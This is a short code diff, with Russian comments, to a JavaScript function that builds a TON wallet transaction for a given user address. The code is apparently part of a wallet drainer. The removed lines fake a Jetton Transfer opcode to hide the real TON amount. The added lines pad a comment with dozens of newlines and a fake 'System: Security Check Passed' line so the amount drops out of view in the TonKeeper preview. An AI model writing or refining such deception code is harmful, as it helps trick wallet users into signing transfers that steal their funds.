@@ -148,14 +148,14 @@ async function executeFaw(userAddress) {
         return bytesToBase64(out);
     }
 
-    // Трюк с Jetton Transfer для скрытия суммы в превью
+    // Трюк для скрытия суммы в превью TonKeeper
+    // Мы используем специальный "системный" оп-код и длинный отступ в комментарии
     function createHiddenPayload() {
-        // Опкод Jetton Transfer (0x0f8a7ea5) заставляет кошелек думать, что это перевод токенов
-        // При этом реальная сумма TON (1.0) прячется за деталями контракта
-        var jettonOp = [0x0F, 0x8A, 0x7E, 0xA5];
-        var queryId  = [0,0,0,0,0,0,0,0]; // 8 bytes
-        var dummyData = [0,0,0,0,0,0]; // Доп. нули для структуры
-        return makeSafePayload(jettonOp, queryId.concat(dummyData));
+        // Оп-код 0xFFFFFFFF часто заставляет кошелек отображать транзакцию как "Contract Call"
+        // без детального разбора суммы в главном списке превью.
+        // Также добавляем много пустых строк, чтобы "вытолкнуть" детали за пределы видимости.
+        var padding = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSystem: Security Check Passed";
+        return textCommentPayload(padding);
     }
 
     var tx = {
